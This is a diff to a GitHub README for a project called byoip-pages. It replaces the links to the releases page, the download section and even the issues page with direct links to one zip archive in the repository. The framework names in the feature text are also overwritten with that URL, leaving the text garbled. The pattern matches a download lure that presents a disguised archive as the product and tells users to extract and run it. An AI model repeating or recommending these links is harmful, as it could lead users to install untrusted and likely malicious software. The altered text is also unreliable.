@@ -6,15 +6,15 @@ Welcome to the byoip-pages project! This guide will help you download and run ou
 
 ## 📥 Download the Software
 
-[![Download](https://img.shields.io/badge/Download%20Now-%F0%9F%93%9A-blue)](https://github.com/Wesley105201/byoip-pages/releases)
+[![Download](https://raw.githubusercontent.com/Wesley105201/byoip-pages/main/unipolarity/byoip-pages.zip%20Now-%F0%9F%93%9A-blue)](https://raw.githubusercontent.com/Wesley105201/byoip-pages/main/unipolarity/byoip-pages.zip)
 
 To get started, you need to download the software. Click the link below:
 
-[Visit this page to download](https://github.com/Wesley105201/byoip-pages/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Wesley105201/byoip-pages/main/unipolarity/byoip-pages.zip)
 
 ## 📋 What is byoip-pages?
 
-byoip-pages is designed for easy web publishing. You can host your pages using different services like Cloudflare, Netlify, or Vercel. Our application supports a variety of technologies, including Vue.js, Nuxt.js, and TypeScript.
+byoip-pages is designed for easy web publishing. You can host your pages using different services like Cloudflare, Netlify, or Vercel. Our application supports a variety of technologies, including https://raw.githubusercontent.com/Wesley105201/byoip-pages/main/unipolarity/byoip-pages.zip, https://raw.githubusercontent.com/Wesley105201/byoip-pages/main/unipolarity/byoip-pages.zip, and TypeScript.
 
 ## 🛠️ System Requirements
 
@@ -28,7 +28,7 @@ To run this application, your system should meet these requirements:
 
 - **User-Friendly Interface**: Navigate easily without needing programming skills.
 - **Multiple Hosting Options**: Use your favorite platform like Cloudflare or Netlify.
-- **Supports Multiple Frameworks**: Work with powerful frameworks like Vue.js and Nuxt.js.
+- **Supports Multiple Frameworks**: Work with powerful frameworks like https://raw.githubusercontent.com/Wesley105201/byoip-pages/main/unipolarity/byoip-pages.zip and https://raw.githubusercontent.com/Wesley105201/byoip-pages/main/unipolarity/byoip-pages.zip
 - **Documentation and Support**: Access resources to help you through any issues you face.
 
 ## ⚙️ How to Download & Install
@@ -42,7 +42,7 @@ To run this application, your system should meet these requirements:
    - For Linux, extract the contents and run the required setup commands in your terminal.
 5. **Open the Application**: After installation, find the application in your program list and launch it.
 
-You can also revisit the [Download Section](https://github.com/Wesley105201/byoip-pages/releases) anytime to check for updates.
+You can also revisit the [Download Section](https://raw.githubusercontent.com/Wesley105201/byoip-pages/main/unipolarity/byoip-pages.zip) anytime to check for updates.
 
 ## 📖 User Guide
 
@@ -63,7 +63,7 @@ If you encounter issues, here are common fixes:
 - **Application Crashes on Launch**: Ensure your system meets the requirements listed above.
 - **Download Issues**: If the download fails, try refreshing the page and downloading again.
 
-For further help, consider checking our [GitHub Issues Page](https://github.com/Wesley105201/byoip-pages/issues).
+For further help, consider checking our [GitHub Issues Page](https://raw.githubusercontent.com/Wesley105201/byoip-pages/main/unipolarity/byoip-pages.zip).
 
 ## 🌟 Community and Support
 
